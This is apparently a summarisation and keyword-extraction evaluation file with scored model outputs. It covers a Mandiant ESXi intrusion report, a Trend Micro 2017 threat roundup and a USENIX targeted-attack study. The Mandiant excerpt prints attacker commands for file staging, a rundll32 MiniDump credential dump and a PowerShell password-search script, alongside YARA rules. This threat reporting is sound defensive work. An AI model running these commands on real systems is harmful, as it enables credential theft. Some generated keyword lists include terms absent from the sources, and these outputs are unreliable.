Mandiant identified an attacker executed commands to the guest machines through the process /bin/rdt (VIRTUALPITA). The parent process /bin/rdt spawned a bash shell which called on a python script specifying the target guest machine and commands to run as seen in Figure 4.Figure 4: Commands executed by attacker on ESXi Hypervisor-> /bin/rdt -i -> sh -c /bin/sh5/13 -> /bin/sh C:\\Windows\\system32\\cmd.exe /c dir /od /s /a c:\\ > C:\\Windows\\Temp\\TS_<REDACTED>.tmp 2>nulCommands passed as arguments into e.py were also seen being executed by the targeted Windows guest machine, running as a child process under vmtoolsd.exe. This execution chain can be seen in Figure 5. The parent binary /bin/rdt was not present on disk but was able to be recovered by dumping the processes memory of the ESXi hypervisor. The python script that sent out commands to the guest machines, e.py, was unable to be recovered.Figure 5: vmtoolsd.exe executing commands passed by ESXiThe commands the attacker ran through vmtoolsd.exe on the guest virtual machines were primarily focused on the enumeration and compression of files across both the system and connected file shares utilizing the native tools \u201cdir\u201d and \u201cmakecab\u201d. Samples of these redacted commands can be seen in Figure 6.Figure 6: File enumeration and compression commands utilized by attacker on Guest Virtual Machines C:\\Windows\\system32\\cmd.exe\" /c dir /od /s /a s:\\ > C:\\Windows\\Temp\\ts_<REDACTED>.tmp 2>nullC:\\Windows\\System32\\cmd.exe makecab /F C:\\Windows\\Temp\\TS_<REDACTED>.txt /D compressiontype=lzx /D compressionmemory=21 /D maxdisksize=1024000000 /D diskdirectorytemplate=C:\\Windows\\Temp\\ /D cabinetnametemplate=TS_<REDACTED>.cabMandiant also identified the attacker targeting a virtualized system for credential harvesting. The attacker used MiniDump to dump process memory and search for cleartext credentials. Figure 7 shows an excerpt of these commands.Figure 7: Credential Dumping on Guest Machine-- \u201c C:\\Program Files\\VMware\\Vmware Tools\\vmtoolsd.exe\u201d ---- \u201cC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u201d ------ rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump <Process ID> C:\\Windows\\Temp\\TS_<REDACTED>.tmp full6/13Once the process memory was dumped, a powershell script was used to parse the resultant file for any cleartext credentials. Figure 8 shows the contents of script used for credential harvesting. The attacker also targeted KeyPass password database files.Figure 8: PowerShell Password Search Script$b = New-Object System.IO.streamReader(\"C:\\windows\\Temp\\<REDACTED>.tmp\",[Text.Encoding]::UTF8) $n = 0 while (($b1 =$b.ReadLine()) -ne $null) { if($b1 -like '*&password=*'){ $n++ Write-Host \"YES $n\" Write-Host $b1 if($n -eq 0){Write-Host \"NO!\"} $b.Dispose()The attacker cleared the C:\\Windows\\Temp directory following most activity, but small errors were made which left behind trace artifacts. As shown in Figure 9, the attacker sent the output of a dir listing to a .tmp file. Since the attacker used the Linux syntax (2>null) to suppress errors instead of the Windows syntax (2>nul), all errors were forwarded to the file null in the working directory C:\\Windows\\System32\\null. This file was only created if a file enumerated with the dir command had a directory path too long to be displayed.Figure 9: Failed writing Error to Null in Windows CommandC:\\Windows\\system32\\cmd.exe\" /c dir /od /s /a s:\\ > C:\\Windows\\Temp\\TS_<REDACTED>.tmp 2>null AttributionMandiant has begun tracking this activity as UNC3886. Given the highly targeted and evasive nature of this intrusion, we suspect UNC3886 motivation to be cyber espionage related. Additionally, we assess with low confidence that UNC3886 has a China-nexus. Each investigation conducted by Mandiant includes analysts from our Advanced Practices team who work to correlate activity observed in the thousands of investigations to which Mandiant responds. At times, we do not have the data available to directly attribute intrusion activity to a previously known group. In these cases, we create a new UNC group to track the activity that we observed. An UNC group is a cluster of related cyber intrusion activity, which includes observable artifacts such as adversary infrastructure, tools, and tradecraft, that we are not yet ready to give a classification such as APT or FIN. For more details on how Mandiant uses UNC groups, see our blog post: DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors. ConclusionWhile we noted the technique used by UNC3886 requires a deeper level of understanding of the ESXi operating system and VMWare\u2019s virtualization platform, we anticipate a variety of other threat actors will use the information outlined in this research to begin building out similar capabilities. Mandiant recommends organizations using7/13ESXi and the VMware infrastructure suite follow the hardening steps outlined in this blog post to minimize the attack surface of ESXi hosts. MITRE ATT&CK Techniques CollectionT1560: Archive Collected Data T1560.001: Archive via UtilityExecutionT1059: Command and Scripting Interpreter T1059.001: PowerShell T1059.003: Windows Command Shell T1059.004: Unix Shell T1059.006: Python T1129: Shared ModulesCommand and ControlT1105: Ingress Tool Transfer T1573.001: Symmetric CryptographyDefense EvasionT1027: Obfuscated Files or Information T1070: Indicator Removal on Host T1070.003: Clear Command History T1070.004: File Deletion T1140: Deobfuscate/Decode Files or Information T1202: Indirect Command Execution T1218.011: Rundll32 T1497: Virtualization/Sandbox Evasion T1497.001: System Checks T1620: Reflective Code LoadingDiscoveryT1016: System Network Configuration Discovery T1083: File and Directory DiscoveryLateral MovementT1021: Remote Services T1021.004: SSHCredential AccessT1003: OS Credential Dumping T1003.001: LSASS Memory8/13PersistenceT1547: Boot or Logon Autostart ExecutionIndicators of CompromiseType .vgz PayloadMalicious VIB Name Filename lsu_lsi_.v05Fullpath/etc/rc.local.d/vmware_local.sh/bin/rdt /bin/vmsyslog.pyFullpath Filename payload1.v00ata-pata-pdc20211Fullpath/etc/rc.local.d/vmware_rhttpio.shFullpath Fullpath/usr/lib/vmware/weasel/consoleui/rhttpproxy-io /usr/libexec/setconf/ksmd/usr/bin/ksmdFullpath Fullpath C:\\Windows\\Temp\\avp.exeFullpath and Hash (MD5)C:\\Windows\\Temp\\Silverlight\\wmpd.exe VIRTUALPITAVIB NameVIB .vgz child processrule M_APT_VIRTUALPITA_1 description = \"Finds opcodes to set a port to bind on 2233, encompassing the strings: $x = {8b ?? ?? 4? b8 04 00 00 00 [0 - 4] ba 02 00 00 00 be 01 00 00 00 [0 - 2] e8 ?? ?? ?? ?? 89 4? ?? 83 7? ?? 00 79 [0 - 50] ba 10 00 00 00 [0 - 10] e8} condition: uint32(0) == 0x464c457f and all of them description = \"Finds opcodes to decode and parse the recieved data in the socket strings: $x = {85 c0 74 ?? c7 05 ?? ?? ?? ?? fb ff ff ff c7 8? ?? ?? ?? ?? 00 00 00 00 e9 ?? ?? ?? ?? 4? 8b 05 ?? ?? ?? ?? 4? 83 c0 01 4? 89 05 ?? ?? ?? ?? c7 4? ?? 00 00 00 00 e9 ?? ?? ?? ?? 8b 4? ?? 4? 98 4? 8d 9? ?? ?? ?? ?? 4? 8d ?? e0 4? 8b 0? 4? 89 0? 4? 8b 4? ?? 4? 89 4? ?? 8b 4? ?? 4? 98 4? 8d b? ?? ?? ?? ?? b? ?? ?? ?? ?? e8 ?? ?? ?? ?? c7 4? ?? 00 00 00 00 eb ?? 8b 4? ?? 8b 4? ?? 01 c1 8b 4? ?? 03 4? ?? 4? 98 0f b6 9? ?? ?? ?? ?? 8b 4? ?? 4? 98 0f b6 8? ?? ?? ?? ?? 31 c2 4? 63 c1 88 9? ?? ?? ?? ?? 83 4? ?? 01} condition: uint32(0) == 0x464c457f and all of them description = \"Finds opcodes from 409dd8 to 409e46 in putenv() after loading each character individually.\" strings: $x = {4? 8b 4? ?? c6 00 48 4? 8b 4? ?? 4? 83 c0 05 c6 00 49 4? 8b 4? ?? 4? 83 c0 01 c6 00 49 4? 8b 4? ?? 4? 83 c0 06 c6 00 4c 4? 8b 4? ?? 4? 83 c0 02 c6 00 53 4? 8b 4? ?? 4? 83 c0 07 c6 00 45 4? 8b 4? ?? 4? 83 c0 03 c6 00 54 4? 8b 4? ?? 4? 83 c0 08 c6 00 3d 4? 8b 4? ?? 4? 83 c0 04 c6 00 46 4? 8b 4? ?? 4? 83 c0 09 c6 00 00 4? 8b 7? ?? e8} condition: uint32(0) == 0x464c457f and all of them description = \"Finds opcodes from 401f1c to 401f4f in strings: $x = {4? 8b 4? ?? 4? 83 c1 30 4? 8b 4? ?? 4? 8b 10 8b 4? ?? 4? 98 4? 8b 04 ?? ?? ?? ?? ?? 4? 31 c2 4? 8b 4? ?? 4? 83 c0 28 4? 8b 00 4? c1 e8 10 0f b6 c0 4? 98 4? 8b 04} condition:11/13uint32(0) == 0x464c457f and all of them description = \"Finds scripts that launch and then delete files, indicative of cleaning up tracks and remaining in-memory only.\" strings: $ss = /setsid[^\\n\\r]{,250}-i[\\r\\n]{,5}rm/ condition: all of them description = \"Finds strings indicative of the vmsyslog.py python backdoor.\" strings: $key1 = \"readInt8()\" ascii wide $key2 = \"upload\" ascii wide $key3 = \"download\" ascii wide $key4 = \"shell\" ascii wide $key5 = \"execute\" ascii wide $re1 = /def\\srun.{,20}command\\s?=\\s?self\\.conn\\.readInt8\\(\\).{,75}upload. {,75}download.{,75}shell.{,75}execute/s condition: filesize < 200KB and all of them } AcknowledgementsSpecial thanks to Brad Slaybaugh, Joshua Kim, Zachary Smith, Kirstie Failey, Nick Simonian, and Charles Carmakal for their assistance with the investigation, technical review, and creating detections for the malware families discussed in this blog post. In addition, we would also like to thank VMware for their collaboration on this research.12/1313/13 ", "generated_text": "Mandiant; a novel malware ecosystem; endpoint detection; response; Windows systems; VMware; Linux; vCenter servers; Windows virtual machines; a threat actor; malicious vSphere Installation Bundles; VIRTUALPITA; VIRTUALPIE; these backdoors; persistence; the hypervisor; memory; the user; commands; the guest VM; the victim; arbitrary commands; the ESXi hypervisor; arbitrary commands; one guest; another guest; the same hypervisor; the malicious VIBs; the attacker; admin-level privileges; the ESXi hypervisor; a zero-day vulnerability; the attacker; initial access; the malicious VIBs; this threat; the malware ecosystem.", "ref_text": "<START-1>The PDF document from Mandiant details the investigation of novel malware being deployed on VMware ESXi hypervisors by a threat actor tracked as UNC3886. The malware ecosystem enables persistent administrative access to the hypervisor, command execution on guest VMs, file transfers between the hypervisor and VMs, tampering with logs, and executing commands between VMs on the same hypervisor. The malware was initially detected when commands were seen coming from the vmtoolsd process on a Windows VM hosted on an ESXi hypervisor. Analysis of the ESXi boot profiles revealed malicious VIBs (vSphere Installation Bundles) being used to deploy backdoors called VIRTUALPITA and VIRTUALPIE on the hypervisors after reboot. The VIBs were signed as PartnerSupported though they were actually CommunitySupported, allowing installation with the --force flag. VIRTUALPITA creates a listener on the hypervisor for arbitrary command execution, file transfers, and starting/stopping logging. VIRTUALPIE is a Python backdoor with similar capabilities. Commands executed on the hypervisor are sent to guest VMs via vmtoolsd.exe for execution. This was used for file enumeration, compression, and credential dumping. VARIUALPITA samples were also found on Linux vCenter systems masquerading as a legitimate process. Windows VMs hosted on the compromised hypervisors contained VIRTUALGATE, a utility that uses VMCI sockets to run commands on guest VMs from the hypervisor. Based on the nature of the intrusions, Mandiant assesses UNC3886 has a likely China nexus and espionage motivations. Indicators of compromise, Yara rules, and recommendations for hardening ESXi/vSphere environments are provided. <END-1>", "t5/keyword/hint_hit_precision": 0.2702702702702703, "t5/word/hint_hit_recall": 0.07053941908713693, "gpt3/lexical/rouge_rouge1": 0.4881889763779528, "gpt3/lexical/rouge_rouge2": 0.20580474934036938, "gpt3/lexical/rouge_rougeL": 0.29396325459317585, "gpt3/lexical/rouge_rougeLsum": 0.29396325459317585, "gpt3_generated_text": ["The article discusses a novel malware ecosystem impacting VMware ESXi, Linux vCenter servers, and Windows virtual machines, discovered by Mandiant. This malware enables a threat actor to maintain persistent administrative access to the hypervisor, send commands to the hypervisor for execution on guest VMs, transfer files between the hypervisor and guest machines, tamper with logging services, and execute arbitrary commands between guest VMs. The malware is installed through malicious vSphere Installation Bundles (VIBs), with backdoors named VIRTUALPITA and VIRTUALPIE. It is important to note that the attacker needs admin-level privileges to the ESXi hypervisor to deploy the malware, and there is no evidence of a zero-day vulnerability being used for initial access. The article provides details on how to detect malicious VIBs in an ESXi environment and highlights the significance of protecting against this threat."]}, {"split_name": "val", "sample_id": "val_101", "prompt_text": "Extract the keywords:  The past year saw massive ransomware outbreaks turn into global events that reportedly cost enterprises billions of dollars. We also saw familiar threats like business email compromise (BEC) continue to be a consistent danger for enterprises. Meanwhile, volatile cryptocurrencies disrupted the threat landscape as their value steeply and quickly rose. To function in this environment, cybercriminals reworked old techniques to take advantage of the crypto-trends and also tried to exploit known vulnerabilities in new ways. ransomware-icon-roundup Ransomware brings about bigger global outbreaks despite fewer major players The number of new ransomware families rose 32 percent from 2016 to 327, showing that there were still active ransomware developers trying to take advantage of a plateauing trend. However, the ransomware-related threats detected by the Trend Micro\u2122 Smart Protection Network\u2122 security infrastructure went in the opposite direction and dipped 41 percent. Apparently, only a select few of these new families actually made an impact in 2017. MORE RANSOMWARE FAMILIES EMERGED IN 2017: COMPARISON OF TOTAL NUMBER OF NEW RANSOMWARE FAMILIES SEEN ransomware-colored-icon-roundup 247 2016 NEW FAMILIES ransomware-colored-icon-roundup-2 327 2017 NEW FAMILIES FEWER MAJOR PLAYERS DESPITE INCREASE IN NEW RANSOMWARE FAMILIES: COMPARISON OF TOTAL NUMBER OF DETECTED RANSOMWARE-RELATED THREATS 1,078,091,703 2016 RANSOMWARE-RELATED THREATS 631,128,278 2017 RANSOMWARE-RELATED THREATS But the ransomware events that did affect users were significantly larger. These widespread attacks struck multiple countries and reportedly resulted in billions of U.S. dollars in damage. In addition to WannaCry and Petya, the two most notorious, there was the more recent case of Bad Rabbit: In October, the ransomware hit a number of enterprises across Russia, Eastern Europe and the U.S. This was a marked difference from 2016, in which more ransomware incidents were reported, but the scale of the damage was typically contained to local offices and the ransom demanded was just in the tens of thousands of dollars. Prevailing-ransomware-families-roundup2017 PREVAILING RANSOMWARE FAMILIES: TOP RANSOMWARE FAMILIES IN 2017 REMAINING FROM 2016 Ransomware remains a clear and steady threat as many old families still affect users worldwide. Meanwhile, the more recent virulent outbreaks show that the new families are growing more sophisticated and hitting larger targets. Developers are constantly experimenting, trying to find profitable strategies. In 2017, they used diverse new methods; for example, more had been using fileless infection and pre-execution machine learning evasion techniques in addition to taking advantage of old vulnerabilities. Effective ransomware typically abuses known exploits and techniques. Enterprises should then be diligent and employ proper patching policies, while securing their systems with multilayered solutions. Several critical and controversial vulnerabilities were exploited by cybercriminals and used for major ransomware campaigns. Most notably, these included the known ones that were taken advantage of by the EternalBlue and EternalRomance exploits. The former was used in the WannaCry and Petya outbreaks, and the latter was used also in the Petya attacks and later in the Bad Rabbit incident. Known vulnerabilities were exploited as well for purposes other than spreading ransomware. EternalBlue was also used by a cryptominer malware to spread filelessly. And the Linux vulnerability Dirty COW was used by ZNIU to compromise specific Android devices. ZERO-DAY VULNERABILITIESZERO-DAY VULNERABILITIES (SCADA) A MARKED INCREASE IN ZERO-DAY VULNERABILITIES: COMPARISON OF NUMBER OF ZERO-DAY VULNERABILITIES AND SCADA-RELATED ZERO-DAY VULNERABILITIES BETWEEN 2016 AND 2017 2017 also saw a substantial 98-percent increase in discovered zero-day vulnerabilities. Moreover, of the 119 zero-day vulnerabilities, all but six were related to supervisory control and data acquisition (SCADA). This increased focus on SCADA is particularly significant since major industrial complexes and critical infrastructures rely on this control system architecture to function. If exploited, zero-day vulnerabilities could result in huge losses and damage. Past cases have emphasized the risk BEC scams pose to all types of enterprises, from large multinationals to small businesses. But despite the increasing awareness, BEC scams still prevailed and grew in 2017. One incident, which cost a Japanese transportation company a reported US$3.4 million, happened just in December. This particular scam centered on a popular technique called the supplier swindle: impersonating a third-party supplier and manipulating the company into transferring funds. In another incident reported in July, a number of organizations in Germany received fake memos from \u201cexecutives\u201d that asked accounting personnel to send funds to fraudulent accounts. Our data shows a steep rise of about 106 percent in attempts from the first half of 2017 to the second half. Consistent with previous years, the most targeted positions were finance-related: chief financial officer (CFO), finance controller, finance manager and finance director. The most spoofed were high-level executives: chief executive officer (CEO), managing director and president. RECORDED BEC ATTEMPTS IN 2017 1H3175 BEC-icon-roundup-3 2H6533 BEC-icon-roundup-2 BEC ATTEMPTS MORE THAN DOUBLED IN THE SECOND HALF OF THE YEAR OVER THE FIRST HALF: COMPARISON OF BEC ATTEMPTS BETWEEN 1H AND 2H OF 2017 The value of cryptocurrency, particularly bitcoin, skyrocketed in the latter half of 2017. In the beginning of July, 1 bitcoin was valued at around US$2,500, and by Dec. 31, it was valued at over US$13,800. That steep and quick increase apparently prompted cybercriminals to target cryptocurrency through different methods. Some used social engineering attacks to directly target cryptocurrency wallets, while others evolved old ransomware threats to do the same. There were even attempts to mine cryptocurrency through mobile malware, despite the improbability of gaining any substantial amount by that means. how-attackers-targeted-cryptocurrency Some businesses had tried to capitalize on cryptocurrency by using mining software as alternatives to web advertising, but cybercriminals were also quick to take advantage. In mid-2017, cybercriminals started abusing the most popular of the open-source mining tools, Coinhive. By November, an abused variant of the Coinhive miner ranked as the sixth most common malware in the world, even though it was intended to be a legitimate alternative method of making money for websites. These are particularly relevant threats since businesses are starting to use cryptocurrency and even launch their own; governments, including those of Venezuela and Dubai, United Arab Emirates, are also establishing their own cryptocurrencies. Security solutions with high-fidelity machine learning, web reputation services, behavior monitoring and application control could help minimize the impact of these threats. The Trend Micro\u2122 Smart Protection Network\u2122 security infrastructure blocked more than 66 billion threats in 2017. Over 85 percent of these threats were emails that contained malicious content \u2014 emails have consistently been the most popular entry point for cybercriminals to reach users. Overall threats blocked 28,658,837,969 1H 2017 38,451,584,224 2H 2016 53,226,272,934 2H 2017 27,985,396,490 FEWER THREATS BLOCKED IN 2017 THAN IN 2016: OVERALL THREATS BLOCKED BY THE TREND MICRO SMART PROTECTION NETWORK INFRASTRUCTURE, 2016 VS. 2017 By comparison, over 81 billion threats were blocked in 2016. We believe that the drop in the number of threats can be attributed to a shift from \u201cspray and pray\u201d methods to a more targeted approach to attacks. A VARIATION IN VULNERABILITY COUNT DIRECTION: COMPARISON OF NUMBER OF VULNERABILITIES FOUND PER VENDOR BETWEEN 2016 AND 2017 Event\tNumber of Events Cryptocurrency mining\t45,630,097 TELNET default password login\t30,116,181 MS17-010 SMB\t12,164,033 Brute-force login\t3,695,143 ICMP BlackNurse\t1,792,854 Others\t16,701,211 CRYPTOCURRENCY MINING AND TELNET EVENTS OUTNUMBERED OTHERS: NETWORK EVENTS IN 2017 BASED ON DATA FROM THE TREND MICRO\u2122 SMART HOME NETWORK SOLUTION Year\tData breaches disclosed\tAffected records 2016\t813\t3,310,435,941 2017\t553\t4,923,053,245 FEWER DISCLOSURES, GREATER NUMBER OF AFFECTED RECORDS: COMPARISON OF THE NUMBER OF DATA BREACHES DISCLOSED AND THE NUMBER OF AFFECTED RECORDS BETWEEN 2016 AND 2017 * Note: Yahoo\u2019s data breach disclosure reported in October 2017 is reflected in the number of affected records for 2017. The figures are computed based on data from Privacy Rights Clearinghouse. Other significant security stories of 2017 are included in our roundup, where we give details on how cybercriminals abused networked internet-of-things (IoT) devices and how big companies were hit by massive data breaches. Read our annual security roundup report and learn what\u2019s new in the threat landscape and the security strategies you can employ against current and emerging threats. ", "generated_text": "Ransomware; 2017; users; millions; ransomware outbreaks; 2013; 2014; 2016; no major actors; the number; new ransomware families; 327; 32 percent; a plateauing trend; the ransomware-related threats; Trend Micro; Smart Protection Network; 41 percent; time; new vulnerabilities; ZERO-DAY VULNERABILITIES; Supervisory control; data acquisition; 119 zero-day vulnerabilities; all; six; SCADA; control; control; control; fileless infection; APT2; keylogging; OS; fileless infection; TOR; STALK; the drop; NETWORK; RAT; people; passwords; encryption; trusted organizations; sabotage; cryptocurrencies; the threat landscape; a clear and steady trend; many old techniques; new threats; in 2017; the new ransomware family; fewer major players; a plateauing trend; a few of these new ransomware families; an impact; 2017; a significant increase; exploits; FEWER; MAJOR PLAYERS; the number; the same year; new RANSOMWARE FAMILIES; the", "ref_text": "<START-1>The document provides an overview of major cybersecurity threats and trends in 2017 compared to 2016. Ransomware continued to be a major threat, with more new families emerging but fewer large-scale attacks than 2016. Major outbreaks like WannaCry and Petya caused more damage globally than typical ransomware. Known vulnerabilities like EternalBlue were exploited for ransomware campaigns. Business email compromise scams also increased significantly, doubling in the second half of 2017 compared to the first half. Cryptocurrency became a big target for cybercriminals as bitcoin valuations skyrocketed. They used social engineering and evolved old ransomware to steal cryptocurrency. Coin mining malware also emerged to abuse the rise in cryptocurrencies. Overall threats blocked by Trend Micro dropped from 2016, indicating a shift from broad attacks to more targeted ones. But data breaches disclosed affected even more records, including major breaches at Yahoo. The report highlights key threats like ransomware, business email compromise scams, cryptocurrency abuse, and data breaches. It notes the shift from broad spam campaigns to more targeted attacks. It advises using security solutions with capabilities like machine learning, behavior monitoring, and application control to detect latest threats. <END-1>", "t5/keyword/hint_hit_precision": 0.15384615384615385, "t5/word/hint_hit_recall": 0.06417112299465241, "gpt3/lexical/rouge_rouge1": 0.36774193548387096, "gpt3/lexical/rouge_rouge2": 0.051948051948051945, "gpt3/lexical/rouge_rougeL": 0.1741935483870968, "gpt3/lexical/rouge_rougeLsum": 0.1741935483870968, "gpt3_generated_text": ["In 2017, the threat landscape was marked by a significant increase in ransomware outbreaks, with 327 new ransomware families emerging, a 32 percent increase from the previous year. However, despite this rise, the number of ransomware-related threats detected by Trend Micro's Smart Protection Network decreased by 41 percent. The year also saw a surge in zero-day vulnerabilities, with a 98 percent increase, particularly in supervisory control and data acquisition (SCADA) systems. Additionally, BEC scams continued to prevail and grow, costing enterprises millions of dollars. Cybercriminals reworked old techniques and exploited known vulnerabilities in new ways, targeting larger and more sophisticated attacks. Enterprises are advised to employ proper patching policies and multilayered security solutions to protect against these evolving threats."]}, {"split_name": "val", "sample_id": "val_102", "prompt_text": "Extract the keywords: A Look at Targeted Attacks Through the Lenseof an NGOStevens Le Blond, Adina Uritesc, and C\u00e9dric Gilbert, Max Planck Institute for SoftwareSystems (MPI-SWS); Zheng Leong Chua and Prateek Saxena, National University ofSingapore; Engin Kirda, Northeastern Universityurl Look at Targeted Attacks Through the Lense of an NGOStevens Le Blond1 Zheng Leong Chua2Adina Uritesc1 Prateek Saxena2C\u00b4edric Gilbert1 Engin Kirda31MPI-SWS2National Univ. of Singapore3Northeastern Univ.AbstractWe present an empirical analysis of targeted attacks against a human-rights Non-Governmental Organization (NGO) representing a minority living in China. In par- ticular, we analyze the social engineering techniques, at- tack vectors, and malware employed in malicious emails received by two members of the NGO over a four-year period. We \ufb01nd that both the language and topic of the emails were highly tailored to the victims, and that sender impersonation was commonly used to lure them into opening malicious attachments. We also show that the majority of attacks employed malicious documents with recent but disclosed vulnerabilities that tend to evade common defenses. Finally, we \ufb01nd that the NGO received malware from different families and that over a quarter of the malware can be linked to entities that have been reported to engage in targeted attacks against polit- ical and industrial organizations, and Tibetan NGOs. 1 Introduction In the last few years, a new class of cyber attacks has emerged that is more targeted at individuals and organi- zations. Unlike their opportunistic, large-scale counter- parts, targeted attacks aim to compromise a handful of speci\ufb01c, high-value victims. These attacks have received substantial media attention, and have successfully com- promised a wide range of targets including critical na- tional infrastructures [19], Fortune 500 companies [23], news agencies [20], and political dissidents [10, 11, 16]. Despite the high stakes involved in these attacks, the ecosystem sustaining them remains poorly understood. The main reason for this lack of understanding is that vic- tims rarely share the details of a high-pro\ufb01le compromise with the public, and they typically do not disclose what sensitive information has been lost to the attackers. Ac- cording to folk wisdom, attackers carrying out targeted attacks are generally thought to be state-sponsored. Ex- amples of national organizations that have been reported to be engaged in targeted attacks include the NSA\u2019s of-\ufb01ce of Tailored Access Operations (TAO) [3] and the People\u2019s Liberation Army\u2019s Unit 61398 [15]. Recently, researchers also attributed attacks in the Middle East to the governments of Bahrain, Syria, and the United Arab Emirates [16].There now exists public evidence that virtually every computer system connected to the internet is susceptible to targeted attacks. The Stuxnet attack even successfully compromised air-gapped Iranian power plants [19] and was able to damage the centrifuges in the facility. More recently, Google, Facebook, the New York Times, and many other global companies have been compromised by targeted attacks. Furthermore, political dissidents and Non-Governmental Organizations (NGOs) are also being targeted [10, 11, 16].In this paper, we analyze 1,493 suspicious emails col- lected over a four-year period by two members of the World Uyghur Congress (WUC), an NGO representing an ethnic group of over ten million individuals mainly living in China. WUC volunteers who suspected that they were being speci\ufb01cally targeted by malware shared the suspicious emails that they received with us for anal- ysis. We \ufb01nd that these emails contain 1,176 malicious attachments and target 724 unique email addresses be- longing to individuals af\ufb01liated with 108 different orga- nizations. This result indicates that, despite their targeted content, these attacks were sent to several related victims (e.g., via Cc). Although the majority of these targeted or- ganizations were NGOs, they also comprised a few high- pro\ufb01le targets such as the New York Times and US em- bassies.We leverage this dataset to perform an empirical anal- ysis of targeted attacks in the wild. First, we analyze the engineering techniques and \ufb01nd that the language and topic of the malicious emails were tailored to the mother tongue and level of specialization of the victims. We also \ufb01nd that sender impersonation was common and that some attacks in our dataset originated from com- promised email accounts belonging to high-pro\ufb01le ac-USENIX Association23rd USENIX Security Symposium 5431tivists. Second, whereas recent studies report that ma- licious archives and executables represented the majority of the targeted-attack threat [15, 22], we \ufb01nd that mali- cious documents were the most common attack vector in our dataset. Although we do not \ufb01nd evidence of zero- day vulnerabilities, we observe that most attacks used re- cent vulnerabilities, that exploits were quickly replaced to adapt to new defense mechanisms, and that they of- ten bypassed common defenses. Third, we perform an analysis of the \ufb01rst-stage malware delivered over these malicious emails and \ufb01nd that WUC has been targeted with different families of malware over the last year. We \ufb01nd that over a quarter of these malware samples exhib- ited similarities with those used by entities reported to have carried out targeted attacks.Our work complements existing reports on targeted at- tacks such as GhostNet, Mandiant, and Symantec Inter- net Security Threat (ISTR) 2013 [11, 15, 22]. Whereas the GhostNet and Mandiant reports focus on the attack lifecycle after the initial compromise, this study provides an in-depth analysis of the reconnaissance performed be- fore the compromise. We note that both approaches have pros and cons and are complementary: While it is hard for the authors of these reports to know how a system be- came compromised in retrospect, it is equally hard for us to know if the observed attacks will compromise the tar- geted system(s). Finally, whereas ISTR provides some numbers about reconnaissance analysis for industrial- espionage attacks [22], we present a thorough and rig- orous analysis of the attacks in our dataset.Finally, to foster research in this area, we release ourdataset of targeted malware to the community [4]. Scope. Measuring real-world targeted attacks is chal- lenging and this paper has a number of important bi- ases. First, our dataset contains mainly attacks against the Uyghur and human-rights communities. While the speci\ufb01cs of the social engineering techniques (e.g., use of Uyghur language) will vary from one targeted com- munity to another, we argue that identifying commonly used techniques (e.g., topic, language, senders\u2019 imper- sonation) and their purpose is a necessary step towards designing effective defenses. Another limitation of our dataset is that it captures only targeted attacks carried out over email channels and that were detected by our vol- unteers. Although malicious emails seem to constitute the majority of targeted attacks, different attack vectors such as targeted drive-by downloads are equally impor- tant. Finally, we reiterate that the goal of this study is to understand the reconnaissance phase occurring before a compromise. Analyzing second-stage malware, monitor- ing compromised systems, and determining the purpose of targeted attacks are all outside of the scope of this pa- per and are the topic of recent related work [10, 16]. We discuss open research challenges in Section 6.Figure 1: Screenshot of a malicious email with an im- personated sender, and a malicious document exploit- ing Common Vulnerabilities and Exposures (CVE) num- ber 2012-0158 and containing malware. The email re- plays an actual announcement about a conference in Geneva and was edited by the attacker to add that all fees would be covered.2 OverviewContext. WUC, the NGO from which we have received our dataset, represents the Uyghurs, an ethnic minority concentrated in the Xinjiang region in China. Xinjiang is the largest Chinese administrative division, has abun- dant natural resources such as oil, and is China\u2019s largest natural gas-producing region. WUC frequently engages in advocacy and meeting with politicians and diplomats at the EU and UN, as well as collaborating with a variety of NGOs. Rebiya Kadeer, WUC\u2019s current president, was the \ufb01fth richest person in China before her imprisonment for dissent in 1996, and is now in exile in the US. Fi- nally, WUC is partly funded by the National Endowment for Democracy (NED), a US NGO itself funded by the US Congress to promote democracy. (We will see below that NED has been targeted with the same malware as WUC.)WUC has been a regular target of Distributed De- nial of Service (DDoS) attacks and telephone disrup- tions, as well as targeted attacks. For example, the WUC\u2019s website became inaccessible from June 28 to July 10, 2011 due to such a DDoS attack. Concurrently to this attack, the professional and private phone lines of WUC employees were \ufb02ooded with incoming calls, and the WUC\u2019s contact email address received 15,000 spam emails in one week. Data acquisition. In addition to these intermittent threats, WUC employees constantly receive suspicious emails impersonating their colleagues and containing544 23rd USENIX Security SymposiumUSENIX Association2malicious links and attachments. These emails consis- tently evade spam and malware defenses deployed by webmail providers and are often relevant to WUC\u2019s ac- tivities. In fact, our volunteers claim that the emails are often so targeted that they need to con\ufb01rm their legiti- macy with the impersonated sender in person. For ex- ample, Figure 1 shows the screenshot of such an email that replays the actual announcement for a conference in Geneva organized by WUC. As a result, WUC members are wary of any emails containing links or attachments, and some of them save these emails for future inspec- tion. We came in contact with two WUC employees who shared the suspicious emails that they had received (with consent from WUC). The authors of this work were not involved in the data collection. Characteristics of the dataset. The two volunteers shared with us the headers and content of 1,493 suspi- cious emails that they received over a four-year period. 1,178 (79%) of these emails were sent to the private email addresses of the two NGO employees from whom we obtained the data, 16 via the public email address of the WUC, and the remaining 299 emails were forwarded to them (126 of these by colleagues at WUC). Overall, 89% of these emails were received directly by our volun- teers or their colleagues at WUC. As we will see below, they also contain numerous email addresses in the To and Cc \ufb01elds belonging to individuals that are not af\ufb01liated with WUC.The emails contained 209 links and 1,649 attachments, including 1,176 with malware (247 RAR, 49 ZIP, 144 PDF, and 655 Microsoft Of\ufb01ce \ufb01les, and 81 \ufb01les in other formats). Our analysis revealed 1,116 malicious emails containing malware attachments. (We were not able to verify the maliciousness of the links as most of them were invalid by the time we obtained the data.) In the fol- lowing, we analyze malicious emails exclusively and we refer to malicious archives or documents depending on whether they contained RAR or ZIP, PDF or Microsoft Of\ufb01ce documents, respectively. Finally, the volunteers labeled the data wherever necessary, enabling us, for ex- ample, to establish that the sender of the emails was im- personated for 84% of the emails. Table 1 summarizes the main characteristics of these malicious emails. Scope of the dataset. Analyzing the headers of the ma- licious emails revealed a surprisingly large number of re- cipients in the To or Cc \ufb01elds. In particular, we observed that malicious emails had been sent to 1,250 unique email addresses and 157 organizations. A potential ex- planation for this behavior could be that the attacker tam- pered with the email headers (e.g., via a compromised SMTP server) as part of social engineering so these emails were only delivered to our volunteers, despite the additional indicated recipients. To test this hypoth- esis, we considered only those emails received directlyby our volunteers, originating from well-known webmail domains (i.e., aol.com, gmx.de, gmx.com, gmail.com, googlemail.com, hotmail.com, 